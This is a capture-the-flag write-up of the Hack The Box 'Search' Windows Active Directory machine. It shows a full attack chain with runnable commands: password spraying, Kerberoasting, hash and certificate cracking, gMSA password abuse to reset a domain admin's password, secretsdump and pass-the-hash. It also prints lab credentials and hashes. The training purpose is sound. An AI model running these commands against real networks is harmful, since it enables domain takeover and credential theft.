![image](https://user-images.githubusercontent.com/64952843/165166129-a70c82e7-12d8-4280-965e-f8cdd97b6913.png)

# [SEARCH- BOX]  
Hi folks, today I am going to solve an Hard rated hack the box machine,Search created by dmw0ng.So without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *TCP over SSH
  *HTTP Default page
  *Host windows server
  
#### code-Nmap

```bash
nmap -sC -sV  -A -oN nmap/search 10.10.11.129
```


#### output

![[namp.png]]

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-06 02:28 EDT
Nmap scan report for 10.10.11.129
Host is up (0.26s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Search &mdash; Just Testing IIS
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-05-06 06:29:15Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-05-06T06:31:04+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: 2022-05-06T06:31:04+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-05-06T06:31:04+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2022-05-06T06:31:04+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-05-06T06:31:04+00:00; +1s from scanner time.
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
| smb2-time: 
|   date: 2022-05-06T06:30:04
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 145.87 seconds
```

Elven ports are open:
port[53]- domain 
port[80]-http
port[88]-kerberos-sec
port[135]- netbios-ssn
port[445]-microsoft-ds?
port[464]-kpasswd5?
port[593/]-ncacn_http    
port[636]- ssl/ldap      
port[443]-ssl/http
port[3268]-  ldap
port[3269]-ssl/ldap

being a windows server let get the host so as to confirm the host by doing this using [crackmapexec](https://github.com/byt3bl33d3r/CrackMapExec/wiki/Installation)

#### code-Get host
```bash
cme smb 10.10.11.129
```

#### output
![[domain.png]]

we need to add the hostname to ``/etc/hosts ``file 

#### code-/etc/hosts
```bash
echo 10.10.11.129 search.htb > /etc/hosts
```


## Default Page-RESEARCH
so lets check the default page [Resarch](http://10.10.11.129)

![[Search/search png/web.png]]

sine this is a windows server and there active directory i found out that the users in our team could be potential users on the box

![[Search/search png/users.png]]

so i decide to copy there names and filter it so as to make `potential usernames` by copy pasteing our team then removing Image and Manager as this are not potential names by 

#### code-Filter
```bash
cat users.txt |grep -v 'Image\|Manger' |grep . > user.txt
```

#### output

![[remove.png]]

so lets filter this name to possible users using there `firstnames` ,`lastnamee` and `first and lastname with a break` using a ruby tool called [Username Anarchy](https://github.com/urbanadventurer/username-anarchy)

#### code-anarchy
```bash
./username-anarchy  --input-file /home/leshack98/project/HTB/Search/users.txt --select-format first,first.last,f.last,flast > /home/leshack98/project/HTB/Search/newusers.txt
```

#### output

![[newusers.png]]

so we have a long big username file so i would want to check valid users usinf a tool called `kerbrute` which is a tool to quickly `bruteforce` and `enumerate` valid` Active Directory accounts` through Kerberos Pre-Authentication.[kerbrute](https://github.com/ropnop/kerbrute)

#### code-kerbrute
```bash
 kerbrute userenum --dc 10.10.11.129 -d search.htb newusers.txt 
```

#### output

![[kerbrute.png]]

we find three valid username valid with the format of `fastname.lastname` so i decide to check for more users in the web and foundin our Features image another hint 

#### output

![[hope.png]]

it has been written send passwor to `Hope Sharp` and a passord `IsolationIsKey?`

#### output

![[sharp.png]]


so l decide to add `Hope Sharp` to `newusers.txt` so that i can use `Kerbrute` to see if she is a valid user

#### output

![[kerbrutenew.png]]

as you can see know we have Four username and Hope is also a valid user so lets check for the password to all the users by switching our mode to `passwordspray` using the following code.

#### code-kerbrute
```bash
kerbrute passwordspray --dc 10.10.11.129 -d search.htb newusers.txt 'IsolationIsKey?
```

#### output

![[passwordhope.png]]

 i find a valid login for sharp so i decide to check if can be able to login with with the user by passing it to `crackmapexec  
 
```bash
cme smb  10.10.11.129 -u hope.sharp -p 'IsolationIsKey?'
```

![[crack.png]]

i get a login but  it does not say `pound` so we cannot use it so i decide to use `BloodHound` which is an **Active Directory (AD) reconnaissance** tool that can reveal hidden relationships and identify attack paths within an AD environment.

so lets setup a our bloodhound python injester using  virtual enviroment **if python** has some issue while executing this script because of its lib having dependency conflicts by doing this 

#### code-enviroment
```bash
python3 -m venv .search
```

#### code-enviroment
```bash
source .search/bin/activate
```

#### output

![[enviroment.png]]

**if not** you can setup you bloodhound python injester just as usual 

#### code-bloodhound.py
```bash
python3 bloodhound.py -u hope.sharp -p 'IsolationIsKey?' -d search.htb -ns 10.10.11.129 -c All 
```

#### output

![[bloodhoundpy.png]]

so lets start a `neo4j`  which Neo4j **facilitates personal data storage and management**: it allows you to track where private information is stored and which systems, applications, and users access it. The graph data model helps visualize personal data and allows for data analysis and pattern detection using this 

```bash
sudo neo4j console
```

#### output

![[neo4j.png]]


Then we start our [BloodHound](https://github.com/BloodHoundAD/BloodHound) if you are new then go change  credential on [neo4j website](http://localhost:7474/browser/)
so let upload our `json` file that we generated with the BloodHound injester using python3 to `Bloodhound`.

#### output

![[json.png]]

In `BloodHound` the first thing i do is to check for list of `all Domain Admin` and i find `two members` one has a diamond who is a user with a high value and the other does not have it so i decide to flag him with a diamond to as user of high value

#### output

![[admins.png]]

so next i decide to check for ` Kerberoastable Accounts` if two of them 
**.** KRBGT@SEARCH.HTB
**.** WEB_SVC@SEARCH.HTB

#### output

![[kerbetous.png]]

so i decide to use `impacket` to dump `WEB_SVC@SEARCH.HTB` Using the **GetUserSPNs**.py script from [Impacket](https://github.com/SecureAuthCorp/impacket) in combination with `Hashcat` to perform the "Kerberoasting" attack, to get a useraccounts password

#### code-GetUserSPNs.py
```bash
impacket-GetUserSPNs search.htb/hope.sharp:IsolationIsKey? -outputfile kerberoast   
```

#### output

![[GetUserspn.png]]

After we cat the outputfile we have a hash 

#### output

![[hashker.png]]

#### code-Hash
```bash
$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$e0e891cba8b81b4c2091f250cd92a9f1$a8ff739dc0f11fe2b6022636c15252b4af80bde85fa261dbf9ebb9d63d0fd126840af75c4d5099875cbb72d36cc11c79da5c9f370767473356196bb95a29c79d2e1b6ca1d942da3e565a6ad43b0f261b1dd3339c1a50c7c3e55ffb10cca129683eeaab7934a07b594d6ad9832916b4096f48a6ee738c632ce3c51327dac6ee6a9d508c32ec2a28f7d81c86a9b55f1275f7df257a80ec944c1526e554e3c72785b1fd945825d17f7548431332b86a2ea1560308b157ebf817c97299418e10d74aaaa9d703d9d6af77875cc3aef342f551c76e134b0668e159c6349f07e676b6428e7e26186994595457a1d7c023d81e7251025e9073f99e6f46b20015be7bf678a0f488108c3549a5356e3f56e45b57e8d8be4eb46f0b8badd6cc42d72f772f1303ce58d787e222a68b327bbbe899fdb67b7f254d536c4915e06cc9994cc9ce1e3892ccf4c170a50d08e795eeaec576accd01b932210f22c164f6a166927327d2c7eb2f9315deeb533b6986334275c1b4de0ebf7a44d15c979a86bc83f08d8c6cd53b4baec3f49ba1830bf2d895c04e3335b97ae969510394875e3ccc6000d7913f84dc90a61d413c33a9bacd9ec5d4fe1aa4e346895fec15e2aa7ace57a88597999c41a725b6100474c7887ecf0a4558237a27a8abb63811c22b28baab620450e0850bb69b1482e1ce9fe91977576d15a67f7ae8cca85f9fed7c05e168f2a001b1f7986c1fc7e5114a342263965cb2b8ba0409342df05252826464a66c73577d7e9ea3fd5b906502a6febb2707e0105e4c29ba0cd0aa504c7b051f1bb4d656fbf1b411c31c4addfd6bc48867bde4c530e0d34638ec20736ecdc28350e58b975e5be1e47da7cba970698963161a052b32f764dc0ff9c3bd4a35f3500da76a54fd33de132fd158b780bec1b135659b4ebc73ddc0e2c0a12518cc642bc524096429a0d8db5a4b3fa8f7ab12a89a59c8d40d332676328fcd22358308318a97b650afc6e252a7ae856b936f1f416d60733d27fd973fcaf095fb8c7f5dea3f7dda3c0024a4f2403502518f4b3149ad41df94d730a73719347b8398edfb1bb50b9d731ad1a4fdceca9617dd71cdb8c1801dd4746483cd78ecd1289fd2c52826ffabe3f2fd38e58b044e7271c9886d7e7e8954dca70370646506f09eec3a1ab48c82f4ac7e758d8dd5d6e25e492c170bfdf6c923de7f64db6a465c612ffbf2030877032907479b73b1a0f4b565ffe452db79b9e8c1b436d489637d15db6272ce7d31c87729a29600b5329b09a591587b8a2618dd0e35f81026c161605733473d7253d76edaf488bc748a78c231b9713b87c53999f13777a6fa0dbe93baee5c9c49c44b1d45521b3422357d4f7e29efb627e6aa6201f2476284300faf17ec176cdf42a01e0b2af112dc6488f9fe88f49c433ca79573ca24bebf7a2e940cb724facf23ce3540ae639853c12ca94789bd95b71b9bca747cada733
```

so let run hashcat to be able to crack the hash to get the password

#### code-Hashcat
```bash
hashcat --force  hashes/search /usr/share/wordlists/rockyou.txt 
```

#### output

![[hashcracked.png]]

As you can see the passord is `@3ONEmillionbaby` which is for WEB_SVC@SEARCH.HTB  so we can make him owned .so in DOMAINUSER@SEARCH.HTB there are many users lets try getting there name form the json_user that we imported in the BloodHound so that we can `kebrute` to find more valid logins if possible by doing this 

#### code-user_json

```bash
cat 20220506155025_users.json | jq '.data[].Properties | select( .enabled == true) | .name' -r >usersbloodhound
```

#### output

![[usersbooldhound.png]]

so we need to fix and remove @search.htb using the following code 

#### code-fixing

```bash
 cat usersbloodhound.txt |awk -F@ '{print $1}' > usersbloodhound 
```

#### output

![[newusermade.png]]

So lets `kerbrute` with the new password we just find to see if we have valid logins

#### code-kerbrute
```bash
 kerbrute passwordspray --dc 10.10.11.129 -d search.htb usersbloodhound.txt '@3ONEmillionbaby'  
```

#### output

![[validkerb.png]]

The user we find those not do get us anything so i decide to use look for `shared drives/folders` using `crackmapexec`  command 

#### code-shared drives
```bash
cme smb 10.10.11.129 -u edgar.jacobs  -p @3ONEmillionbaby -M spider_plus
```

#### output

![[cme.png]]
so i found out an out put of a json in the directory and decide to check for shared directory by using `jq` to filter the available shared directory like this 

#### code-shared folders
```bash
cat /tmp/cme_spider_plus/10.10.11.129.json | jq  '. | map_values(keys)'   
```

#### output

![[shared.png]]

so i find something intresting on the json  on `RedirectedFolder` 

#### output

![[redirected.png]]

since i have jacobs passwors let me smb to the box using his creditials

#### code-smbclient-jacobs
```bash
smbclient -U edgar.jacobs //10.10.11.129/RedirectedFolders$/
```

#### output

![[smbclient.png]]

so am able to smb in but i can not access the user txt for Sierra because of accessed permission 

#### output 

![[sierra.png]]

so i decide to go to jacobs directory because there was intresting thing in the `Desktop`  

#### output 

![[phishing.png]]

There was a `phising.xlsx `so i decide to dowload and check it out with `libreoffice`
#### output 

![[libreo.png]]

As you can see they are colum A,B,C,D But C is not show so let me try edit the fields to be able to access the colum

#### output 

![[password.png]]

so apparently it has a password protected so we need to edit by `unzipping the document ` then finding the this sheet then removing the password protected tag.

#### output 

![[unzip.png]]

#### output 

![[xlsx.png]]

#### output 
Remove this password tag 

![[sheet2.png]]

so now that the password has been removed lets go check the other column

#### output

![[phishingpass.png]]

we can now see the passwords here so i will use `crackmapexec` to see which credential are valid 

#### Extrainformation
instead of doing all this you can copy the colums from A to D then paste it in a `Microsoft Execl`

#### code-crackmapexec
```bash
cme smb 10.10.11.129 -u phish-u.txt  -p phish-p.txt  --no-bruteforce --continue-on-success
```

#### output

![[cmephish.png]]

so we can only see one user is valid `sierra`  so i decide to check for the `path from owned principal from bloodhound `  
#### output

![[sieraa tree.png]]

you can aslo use bloodhound python injester to get the paths by

#### code-bloodhound injester
```bash
python3 bloodhound.py -u sierra.frye -p '$$49=wide=STRAIGHT=jordan=28$$18' -d search.htb -v --zip  -ns 10.10.11.129 -c All,Loggedon    
```

#### output

![[sierrainjester.png]]

 from Bloodhound you can search path from `Sierra to Adminstrator`

#### output

![[sierrapath.png]]


As you can see the path cleary so lets go smb in  `Sierra` to see the directories 

#### code-smbclient-sierra
```bash
smbclient -U sierra.frye //10.10.11.129/RedirectedFolders$/
```

#### output

![[sierrasmb.png]]

now we are able to get `user.txt` in with sierra access privillage

#### output
![[Search/search png/usertxt.png]]

so there was something intresting in the Backup's  a  `.pfx` and as you know The `. pfx `file, which is in a `PKCS#12 format`, **contains the SSL certificate (public keys) and the corresponding private keys**. Sometimes, you might have to import the certificate and private keys separately in an unencrypted plain text format to use it on another system.

#### output

![[getstaff.png]]

so lets import it to firefox to check what it has as i am using firefox browser so when i import it to my certificates i get it has a passwords

#### output

![[staffbrowser.png]]

so i decide to use  `john the Ripper`   to crack the .pfx file first by changing `pfx to john`  by 

```bash
pfx2john staff.pfx > certs
```

#### output

![[pfx2.png]]

#### code-johnripper
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt   certs  
```

#### output

![[misspissy.png]]

as you can see we are able to crack the password so lets go and import the .ptx file to our browser again know that we have the password.

#### output

![[passwordcert.png]]

so we have  a  ssl   so lets do `gobuster` so as to find the active diractories

#### code-gobuster
```bash
gobuster dir -u  http://10.10.11.129  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -k -o gobusters  
```

#### output

![[Search/search png/gobuster.png]]

we find staff so we we go to the page with http://10.10.11.129 we find an access denied

#### output

![[accessdenied.png]]

we we access the page with https://10.10.11.129 we find a request to accept the certificate 

#### output

![[ssl.png]]

then we find a powershell  web shell Acess 

#### output

![[webshell.png]]

so lets login with sierra.fyre  and reserch as the computers information

#### output

![[resaerch.png]]

we get a powershell with sierra 

#### output

![[powershell.png]]


## Escalate to Root Privileges on Search Machine
Based on the research from the BloodHound previously, we see the path clearly asd we can get the next user on the group by using this [gMSADumper](https://github.com/micahvandeusen/gMSADumper)  using the following code 

#### code-gMSADumper
```bash
 python3 gMSADumper.py -u sierra.frye -p '$$49=wide=STRAIGHT=jordan=28$$18' -l 10.10.11.129  -d search.htb  
```

#### output

![[gmsadumper.png]]

As you can see we can assume there’s an Attack that related to `BIR-ASDF-GMSA` and `make account as high value`  in bloodhound

#### output

![[tRISTIAN.png]]


so i decide to do some check to find ot how i can abuse active directory privillage and i find this from [payloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#forcechangepasswo)  you can read more using this [site](https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/)

#### output

![[gmsa.png]]


so i decide to follow the above producers one by one to abuse `tristan.davice` because he is a member from `Domain.Admin`


#### code-changing password
```bash
$user = 'BIR-ADFS-GMSA'

$gmsa = Get-ADServiceAccount -Identity $user -Properties 'msDS-ManagedPassword'

$blob = $gmsa.'msDS-ManagedPassword'

$mp = ConvertFrom-ADManagedPasswordBlob $blob

$cred = New-Object System.Management.Automation.PSCredential $user, $mp.SecureCurrentPassword

Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {net user tristan.davies password@les98  /domain }
```

since we have chaged `tristan.davies` password lets use `crackmapexec` to validate the password we have changed 

#### code-validate -changed password
```bash
cme smb 10.10.11.129 -u tristan.davies  -p password@les98  --no-bruteforce --continue-on-success
```


![[cmetristan.png]]

so as you can see its `pwnd!` so lets set a `smbclient` because `tristan.davies` password has been changed by us previously to `password@les98`


#### code-smbclient -Tristian
```bash
smbclient //search.htb/C$ -U Tristian.Davies
```


![[tristainsmb.png]]

 In tristan we are able to access the adminstator as you can see

![[tristainadmin.png]]

we can now find the root in the `Admistrator\Desktop

![[roottristan.png]]

## Extra Information Root 
You use the web powershell to get root by converting the  `tristan password `then invoking with `tristan password`  

#### code-changing to tristan
```bash
$secpwd = ConvertTo-SecureString "password@les98" -ASplainText -Force

$credtristian = New-Object System.Management.Automation.PSCredential tristan.davies, $secpwd

Invoke-Command -ComputerName localhost -Credential $credtristian -ScriptBlock { whoami }
```

#### output

![[SIERAA.png]]

you can get `root` using this

#### code-rootinwebshell-powershell
```bash
Invoke-Command -ComputerName localhost -Credential $credtristian -ScriptBlock { type C:\users\administrator\desktop\root.txt }
```

#### output

![[Search/search png/root.png]]

## Extra Information Pwnd! Machine
we want to dump the admistrator hashes so that we can try to crack him by usning `impacket-secretsdump`

#### code-imapcket-secretsdump
```bash
 impacket-secretsdump tristan.davies:'password@les98'@search.htb -just-dc-user Administrator
```

#### output

![[adminhash.png]]

we get the admin hash `Administrator:500:aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6`
so lets use `imapcket-wimexec` and the hash we just found to get in 

#### code-imapcket-wmiexec
```bash
impacket-wmiexec administrator@search.htb -hashes aad3b435b51404eeaad3b435b51404ee:5e3c0abbe0b4163c5612afe25c69ced6
```

#### output

![[smbv3shell.png]]

successful pwnd the box and get  `root.txt` with `adminprivillage` by `type root.txt`

#### output

![[admistaroot.png]]



    -------------------------END successful attack @leshack98----------------------
